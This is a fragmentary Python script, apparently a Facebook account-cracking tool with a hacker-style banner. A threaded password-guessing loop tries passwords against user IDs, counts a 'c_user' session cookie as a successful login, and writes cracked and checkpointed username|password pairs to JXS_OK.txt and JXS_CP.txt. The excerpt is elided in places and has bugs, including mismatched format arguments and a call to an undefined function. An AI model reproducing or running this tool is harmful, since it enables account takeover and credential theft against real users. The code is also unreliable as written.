...
from concurrent.futures import ThreadPoolExecutor as jishanjxs
...
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 11; M2007J17G Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/387.0.0.24.102;]"}
...
logo =                                          """   
   ...
   \033[1;37m######## ##     ##  ######     
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m           JISHAN AHAMMED
\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m          JISHAN AHAMMED
\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m           JISHAN76
\033[1;31m\033[1;37m Version\x1b[1;97m : \033[1;37m             0.0.2
\033[1;37m------------------------\033[1;37m------------------------ """                                              
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mJXS_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mJXS_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back JXS Menu ")
	    jisham()
...
def jishan():
    ...
    print(' [E] exit ')
    print('')
    _jishan___ = input(' [?] Choose option : ')
    if _jishan___ in ('1', '01'):
        __xxx__().jishanx(id)
    if _jishan___ in ('2', '02'):
        create_file()
    if _jishan___ in ('E', 'ee'):
        pass
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[JXS] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [JXS-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('JXS_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [JXS-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('JXS_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print(47*"-")
            with jishanjxs(max_workers=30) as jxsworld:
